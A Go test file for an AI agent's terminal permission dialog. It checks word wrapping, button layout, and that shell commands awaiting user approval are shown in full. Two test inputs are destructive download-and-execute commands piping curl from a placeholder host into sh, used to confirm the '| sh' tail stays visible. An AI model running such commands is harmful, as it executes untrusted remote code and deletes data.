package ui

import (
	"strings"
	"testing"

	"gogent/internal/permission"

	tv "github.com/hobbestherat/turbotui/turbotv"
)

// TestWrapRowCount checks the word-wrap row counter that sizes the dialog body.
// The cases mirror turbotui's TextView Wrap layout (greedy word fill with hard
// splits for over-long words) so the computed height matches what is rendered.
func TestWrapRowCount(t *testing.T) {
	const w = 10
	for _, tc := range []struct {
		name string
		text string
		want int
	}{
		{"empty is one row", "", 1},
		{"short fits", "hello", 1},
		{"exact width", "abcdefghij", 1},
		{"two words wrap", "hello world", 2},
		{"over-long word splits", "abcdefghijk", 2},
		{"over-long with remainder", "abcdefghijklmn", 2}, // 14 -> 10 + 4
		{"over-long exact multiple", "aaaaaaaaaa", 1},     // 10 == width
		{"many small words pack then wrap", "a b c d e f g h i j k", 3},
		{"multiple spaces collapse", "hello     world", 2},
		{"over-long then short joins", "abcdefghijklmn x", 2},
		{"two over-long words", "abcdefghijklmno pqrstuvwxyza", 4},
		{"trailing spaces ignored", "hello   ", 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := wrapRowCount(tc.text, w); got != tc.want {
				t.Errorf("wrapRowCount(%q, %d) = %d, want %d", tc.text, w, got, tc.want)
			}
		})
	}

	// Width below 1 is treated as 1 so a single column never under-counts. The
	// space collapses (word wrap), so each of the 6 runes is its own row.
	if got := wrapRowCount("abc def", 0); got != 6 {
		t.Errorf("wrapRowCount width 0 = %d, want 6 (one rune per column)", got)
	}
}

// over-long word at a width where it is an exact multiple leaves a full last row,
// and a following word correctly starts a new row (not appended to a full one).
func TestWrapRowCountExactMultipleThenWord(t *testing.T) {
	// "aaaaaaaaaa" at width 5 fills two full rows; "b" starts a third.
	if got := wrapRowCount("aaaaaaaaaa b", 5); got != 3 {
		t.Errorf("wrapRowCount(\"aaaaaaaaaa b\", 5) = %d, want 3", got)
	}
}

// TestPermissionDialogBody verifies the full resource/path and shell command appear
// verbatim in the body (no truncation), with the "$ " prompt on the command and
// the right colours. This is the core of issue #122: decision-relevant text must
// not be hidden behind "…".
func TestPermissionDialogBody(t *testing.T) {
	t.Run("shell command kept in full", func(t *testing.T) {
		longCmd := "rm -rf /tmp/build && curl https://example.invalid/some/very/long/path/that/exceeds/the/old/cutoff | sh"
		req := permission.Request{Action: permission.ActionShell, Detail: longCmd}
		got := permissionDialogBody(req, "The agent wants to run shell commands in this session.")
		// Question first, then the full command with a "$ " prefix — nothing elided.
		if len(got) != 2 {
			t.Fatalf("got %d lines, want 2: %+v", len(got), got)
		}
		if got[0].text != "The agent wants to run shell commands in this session." {
			t.Errorf("question line = %q", got[0].text)
		}
		if got[0].color != tv.DefaultTheme.DialogFG {
			t.Errorf("question color = %+v, want DialogFG", got[0].color)
		}
		if got[1].text != "$ "+longCmd {
			t.Errorf("command line = %q, want full command with $ prefix", got[1].text)
		}
		if got[1].color != colorDialogDetail {
			t.Errorf("command color = %+v, want colorDialogDetail", got[1].color)
		}
		if !strings.Contains(got[1].text, "| sh") {
			t.Errorf("dangerous tail hidden: %q", got[1].text)
		}
	})

	t.Run("external path kept in full via question", func(t *testing.T) {
		longPath := "/home/user/very/long/path/that/used/to/be/cut/off/with/ellipsis"
		question := "The agent wants to access a location outside the workspace:\n" + longPath
		got := permissionDialogBody(permission.Request{Action: permission.ActionExternal, Resource: longPath}, question)
		joined := strings.Join(linesText(got), "\n")
		if !strings.Contains(joined, longPath) {
			t.Errorf("full path missing from body:\n%s", joined)
		}
		if strings.Contains(joined, "...") {
			t.Errorf("body elided the path:\n%s", joined)
		}
	})

	t.Run("multiline command keeps prompt only on first line", func(t *testing.T) {
		got := permissionDialogBody(permission.Request{Action: permission.ActionShell, Detail: "echo a\necho b"}, "q")
		if len(got) != 3 {
			t.Fatalf("got %d lines, want 3: %+v", len(got), got)
		}
		if got[1].text != "$ echo a" || got[2].text != "echo b" {
			t.Errorf("multiline detail = %q / %q", got[1].text, got[2].text)
		}
	})

	t.Run("no detail omits the command", func(t *testing.T) {
		got := permissionDialogBody(permission.Request{Action: permission.ActionSubagent}, "The agent wants to spawn a sub-agent.")
		if len(got) != 1 {
			t.Fatalf("got %d lines, want 1: %+v", len(got), got)
		}
	})
}

func linesText(lines []permissionBodyLine) []string {
	out := make([]string, len(lines))
	for i, l := range lines {
		out[i] = l.text
	}
	return out
}

// TestPermissionDialogLayout covers the grow-with-content / clamp-to-terminal /
// scroll-on-overflow sizing. On a roomy terminal the body fits all the content
// (no scroll); on a short terminal it shrinks and scrolls instead of overflowing.
func TestPermissionDialogLayout(t *testing.T) {
	t.Run("short content fits, dialog is compact", func(t *testing.T) {
		body := []permissionBodyLine{{"The agent wants to run shell commands in this session.", tv.DefaultTheme.DialogFG}}
		width, height, bodyY, bodyH, btnY := permissionDialogLayout(120, 40, false, body)
		// Width caps at the max on a wide terminal.
		if width != permissionMaxWidth {
			t.Errorf("width = %d, want %d", width, permissionMaxWidth)
		}
		// Structural identities hold by construction (sanity).
		if height != bodyY+bodyH+5 {
			t.Errorf("height = %d, want bodyY(%d)+bodyH(%d)+5 = %d", height, bodyY, bodyH, bodyY+bodyH+5)
		}
		if btnY != bodyY+bodyH+1 {
			t.Errorf("btnY = %d, want %d", btnY, bodyY+bodyH+1)
		}
		if height < permissionMinHeight {
			t.Errorf("height %d below floor %d", height, permissionMinHeight)
		}
		// The body shows all the content (no scroll) on a roomy terminal.
		contentRows := wrapRowCount(body[0].text, width-5)
		if bodyH < contentRows {
			t.Errorf("bodyH = %d < content %d: short content should not scroll", bodyH, contentRows)
		}
	})

	t.Run("requester pushes body down one row", func(t *testing.T) {
		body := []permissionBodyLine{{"q", tv.DefaultTheme.DialogFG}}
		_, _, bodyY, _, _ := permissionDialogLayout(120, 40, false, body)
		_, _, bodyYReq, _, _ := permissionDialogLayout(120, 40, true, body)
		if bodyY != 1 || bodyYReq != 2 {
			t.Errorf("bodyY = %d (no req) / %d (req), want 1 / 2", bodyY, bodyYReq)
		}
	})

	t.Run("long command grows height to fit, no scroll", func(t *testing.T) {
		longCmd := strings.Repeat("arg-", 60) // ~240 chars -> wraps to several rows
		body := []permissionBodyLine{{"$ " + longCmd, colorTool}}
		width, _, _, bodyH, _ := permissionDialogLayout(120, 40, false, body)
		wrapW := width - 5
		want := wrapRowCount("$ "+longCmd, wrapW)
		if bodyH != want {
			t.Errorf("bodyH = %d, want full content %d (no scroll on a roomy terminal)", bodyH, want)
		}
	})

	t.Run("body scrolls on a short terminal", func(t *testing.T) {
		longCmd := strings.Repeat("arg-", 200) // very tall content
		body := []permissionBodyLine{{"$ " + longCmd, colorTool}}
		_, height, _, bodyH, _ := permissionDialogLayout(120, 12, false, body)
		if bodyH < 1 {
			t.Fatalf("bodyH = %d, want >= 1", bodyH)
		}
		if height > 12 {
			t.Errorf("height %d exceeds terminal 12", height)
		}
		// Body is smaller than the content, so the view must scroll.
		if bodyH >= wrapRowCount("$ "+longCmd, permissionMaxWidth-5) {
			t.Errorf("bodyH %d fits all content; expected to scroll on a short terminal", bodyH)
		}
	})

	t.Run("enormous content caps at max body rows", func(t *testing.T) {
		body := []permissionBodyLine{{"$ " + strings.Repeat("x", 5000), colorTool}}
		_, _, _, bodyH, _ := permissionDialogLayout(120, 80, false, body)
		if bodyH > permissionMaxBodyRows {
			t.Errorf("bodyH = %d, want <= cap %d", bodyH, permissionMaxBodyRows)
		}
	})

	t.Run("tiny terminal never exceeds screen and keeps a body", func(t *testing.T) {
		body := []permissionBodyLine{{"q", tv.DefaultTheme.DialogFG}}
		width, height, _, bodyH, _ := permissionDialogLayout(40, 10, false, body)
		if width > 40 {
			t.Errorf("width %d exceeds terminal 40", width)
		}
		if height > 10 {
			t.Errorf("height %d exceeds terminal 10", height)
		}
		if bodyH < 1 {
			t.Errorf("bodyH = %d, want >= 1", bodyH)
		}
	})
}

// TestPermissionButtonRow checks the three-button row is always in-bounds,
// non-overlapping, with "Allow once" left-anchored, "Deny" right-anchored, and the
// "Always …" button sized to its (possibly elided) label between them.
func TestPermissionButtonRow(t *testing.T) {
	const btnY = 9
	for _, width := range []int{permissionMinWidth, 64, 80, permissionMaxWidth} {
		t.Run("", func(t *testing.T) {
			rightX := width - 3
			allow, always, deny, alwaysText := permissionButtonRow(width, btnY, "Always allow /some/path")
			rects := []tv.Rect{allow, always, deny}
			labels := []string{"Allow once", alwaysText, "Deny"}
			for i, r := range rects {
				if r.Y != btnY || r.H != 1 {
					t.Errorf("rect %d (%q) = %+v, want Y=%d H=1", i, labels[i], r, btnY)
				}
				if r.W <= 0 {
					t.Errorf("rect %d (%q) non-positive width %+v", i, labels[i], r)
				}
				if r.X < 2 || r.X+r.W-1 > rightX {
					t.Errorf("rect %d (%q) %+v out of [2,%d]", i, labels[i], r, rightX)
				}
			}
			if allow.X != 2 {
				t.Errorf("allow X = %d, want left-anchored at 2", allow.X)
			}
			if deny.X+deny.W-1 != rightX {
				t.Errorf("deny right edge = %d, want %d", deny.X+deny.W-1, rightX)
			}
			if allow.W != buttonLabelWidth("Allow once") {
				t.Errorf("allow width = %d, want %d", allow.W, buttonLabelWidth("Allow once"))
			}
			if deny.W != buttonLabelWidth("Deny") {
				t.Errorf("deny width = %d, want %d", deny.W, buttonLabelWidth("Deny"))
			}
			if always.W != buttonLabelWidth(alwaysText) {
				t.Errorf("always width = %d, want label width %d (%q)", always.W, buttonLabelWidth(alwaysText), alwaysText)
			}
			// Non-overlapping, ordered left -> right.
			if allow.X+allow.W-1 >= always.X {
				t.Errorf("allow overlaps always: %+v %+v", allow, always)
			}
			if always.X+always.W-1 >= deny.X {
				t.Errorf("always overlaps deny: %+v %+v", always, deny)
			}
		})
	}
}

// TestPermissionButtonRowElidesLongResource checks a long resource is elided in
// the button caption (the full text stays in the scrollable body) and the button
// still fits its slot without colliding.
func TestPermissionButtonRowElidesLongResource(t *testing.T) {
	long := "Always allow " + strings.Repeat("/deeply/nested", 20)
	allow, always, deny, alwaysText := permissionButtonRow(permissionMinWidth, 9, long)
	if alwaysText == long {
		t.Errorf("long resource was not elided: %q", alwaysText)
	}
	if !strings.HasSuffix(alwaysText, "...") {
		t.Errorf("elided label = %q, want trailing ...", alwaysText)
	}
	if always.W != buttonLabelWidth(alwaysText) {
		t.Errorf("always width %d != label width %d", always.W, buttonLabelWidth(alwaysText))
	}
	if allow.X+allow.W-1 >= always.X || always.X+always.W-1 >= deny.X {
		t.Errorf("buttons collide after elision: %+v %+v %+v", allow, always, deny)
	}
}

// TestFitButtonLabel checks the chrome-aware elision used for button captions.
func TestFitButtonLabel(t *testing.T) {
	for _, tc := range []struct {
		name    string
		label   string
		maxCols int
		want    string
	}{
		{"fits unchanged", "Deny", 8, "Deny"},
		{"exact fit", "Always", 10, "Always"},                     // 6 clean + 4 chrome = 10
		{"elided with ellipsis", "abcdefghij", 8, "a..."},         // 10 clean -> budget 4 -> "a" + "..."
		{"no room for chrome keeps label", "Always", 3, "Always"}, // degenerate
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := fitButtonLabel(tc.label, tc.maxCols)
			if got != tc.want {
				t.Errorf("fitButtonLabel(%q,%d) = %q, want %q", tc.label, tc.maxCols, got, tc.want)
			}
			// When elided, the rendered width must not exceed the budget.
			if got != tc.label && buttonLabelWidth(got) > tc.maxCols {
				t.Errorf("rendered width %d > %d for %q", buttonLabelWidth(got), tc.maxCols, got)
			}
		})
	}
}

// TestPermissionDialogLayoutAcceptance is the end-to-end sizing check for issue
// #122: a long command and a long external path produce a body whose height shows
// all the content on a normal terminal (no information hidden), while still
// degrading to scrolling on a small one.
func TestPermissionDialogLayoutAcceptance(t *testing.T) {
	longCmd := "cat /home/user/very/long/path/that/gets/cut/off/then && curl https://example.invalid/x | sh"
	body := permissionDialogBody(permission.Request{Action: permission.ActionShell, Detail: longCmd}, "Run?")

	t.Run("normal terminal shows everything", func(t *testing.T) {
		width, _, _, bodyH, _ := permissionDialogLayout(120, 40, false, body)
		contentRows := 0
		for _, ln := range body {
			contentRows += wrapRowCount(ln.text, width-5)
		}
		if bodyH < contentRows {
			t.Errorf("bodyH %d < content %d: the command would scroll on a roomy terminal", bodyH, contentRows)
		}
	})

	t.Run("small terminal scrolls but stays on screen", func(t *testing.T) {
		_, height, _, bodyH, _ := permissionDialogLayout(60, 10, false, body)
		if height > 10 {
			t.Fatalf("height %d overflows a 10-row terminal", height)
		}
		if bodyH < 1 {
			t.Fatalf("bodyH %d: no visible body", bodyH)
		}
	})
}
